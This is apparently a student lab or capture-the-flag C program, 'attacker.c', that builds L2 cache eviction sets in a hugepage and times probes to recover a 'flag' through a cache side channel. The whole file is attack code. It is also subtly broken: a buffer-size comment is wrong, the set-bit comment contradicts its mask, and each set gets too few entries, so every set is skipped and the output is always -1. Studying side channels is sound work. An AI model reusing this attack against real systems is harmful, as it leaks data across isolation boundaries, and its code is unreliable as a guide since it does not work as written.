// attacker.c

#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define BUFF_SIZE (256 * 4096)  // 2MB Hugepage (256 * 4KB pages)
#define NUM_SETS 2048           // Skylake server: 2K L2 sets
#define PROBES_PER_SET 16       // Number of cache lines probed per set
#define SAMPLES 5               // Number of repeated measurements

int main() {
    // Initialize huge pages and get buffer
    hugepages_init();  // ✅ Allocate hugepage pool
    uint8_t *buf = (uint8_t *) get_hugepage(0);  // ✅ Get a 2MB hugepage
    if (buf == NULL) {
        perror("Hugepage allocation failed");
        return 1;
    }

    // Prepare eviction sets
    uint8_t *sets[NUM_SETS][PROBES_PER_SET] = {0}; // Initialize array to NULL

    // Fill eviction sets
    for (int i = 0; i < BUFF_SIZE; i += 64) {  // Step 64 bytes = one cache line
        uint64_t addr = (uint64_t)(buf + i);
        int set = (addr >> 6) & 0x7FF;  // Extract bits [6:16) = 11 bits for L2 set
        for (int j = 0; j < PROBES_PER_SET; j++) {
            if (sets[set][j] == NULL) {
                sets[set][j] = (uint8_t *) addr;
                break;
            }
        }
    }

    // Attack: probe all sets, measure access time
    int best_set = -1;
    uint64_t best_latency = 0xFFFFFFFFFFFFFFFF;  // Initialize to large number

    for (int set_idx = 0; set_idx < NUM_SETS; set_idx++) {
        if (sets[set_idx][PROBES_PER_SET-1] == NULL) continue; // Not enough entries

        uint64_t total_time = 0;

        for (int sample = 0; sample < SAMPLES; sample++) {
            for (int probe = 0; probe < PROBES_PER_SET; probe++) {
                total_time += measure_one_block_access_time((uint64_t)sets[set_idx][probe]);
            }
        }

        if (total_time < best_latency) {
            best_latency = total_time;
            best_set = set_idx;
        }
    }

    // Output captured flag
    printf("Captured flag: %d\n", best_set);
    return 0;
}
